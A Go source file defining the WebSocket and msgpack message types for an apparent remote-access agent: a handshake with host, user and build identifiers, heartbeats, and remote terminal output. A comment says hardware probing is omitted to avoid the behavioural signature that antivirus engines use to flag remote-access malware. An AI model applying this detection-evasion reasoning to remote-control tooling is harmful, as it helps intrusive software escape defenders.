package wire

import (
	"context"
	"fmt"
	"sync"

	"github.com/vmihailenco/msgpack/v5"
	"nhooyr.io/websocket"
)

// Writer is an interface for sending binary WebSocket frames.
type Writer interface {
	Write(ctx context.Context, msgType websocket.MessageType, data []byte) error
}

// SafeWriter wraps a websocket.Conn with a mutex for thread-safe writes.
type SafeWriter struct {
	mu   sync.Mutex
	conn *websocket.Conn
}

func NewSafeWriter(conn *websocket.Conn) *SafeWriter {
	return &SafeWriter{conn: conn}
}

func (s *SafeWriter) Write(ctx context.Context, msgType websocket.MessageType, data []byte) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.conn.Write(ctx, msgType, data)
}

// DecodeEnvelope decodes a msgpack-encoded message into a map.
func DecodeEnvelope(data []byte) (map[string]interface{}, error) {
	var env map[string]interface{}
	if err := msgpack.Unmarshal(data, &env); err != nil {
		return nil, fmt.Errorf("msgpack decode: %w", err)
	}
	return env, nil
}

// WriteMsg encodes a message with msgpack and sends it.
func WriteMsg(ctx context.Context, w Writer, msg interface{}) error {
	data, err := msgpack.Marshal(msg)
	if err != nil {
		return fmt.Errorf("msgpack encode: %w", err)
	}
	return w.Write(ctx, websocket.MessageBinary, data)
}

// Hello is the initial handshake message from agent to server.
//
// Intentionally minimal: only the identifiers the server needs to route
// commands (id, hwid, host, os/arch, version, user) plus the enrollment
// signature. We do NOT collect or transmit CPU / GPU / RAM / monitor info,
// because the act of probing those values on Windows (registry walks under
// HKLM\SYSTEM\CurrentControlSet\Control\Class, MachineGuid reads, dynamic
// kernel32 API resolution) is the exact behavioral signature SmartScreen and
// commercial AV engines use to flag commodity remote-access malware.
type Hello struct {
	Type      string `msgpack:"type"`
	ID        string `msgpack:"id"`
	HWID      string `msgpack:"hwid"`
	Host      string `msgpack:"host"`
	OS        string `msgpack:"os"`
	Arch      string `msgpack:"arch"`
	Version   string `msgpack:"version"`
	User      string `msgpack:"user"`
	Country   string `msgpack:"country,omitempty"`
	BuildTag  string `msgpack:"buildTag,omitempty"`
	BuildID   string `msgpack:"buildId,omitempty"`
	PublicKey string `msgpack:"publicKey,omitempty"`
	Signature string `msgpack:"signature,omitempty"`
}

// Ping/Pong heartbeat.
type Ping struct {
	Type string `msgpack:"type"`
	TS   int64  `msgpack:"ts"`
}

// ConsoleOutput is a message sent from agent to server for terminal sessions.
type ConsoleOutput struct {
	Type      string `msgpack:"type"`
	SessionID string `msgpack:"sessionId"`
	Data      []byte `msgpack:"data,omitempty"`
	ExitCode  *int   `msgpack:"exitCode,omitempty"`
	Error     string `msgpack:"error,omitempty"`
}
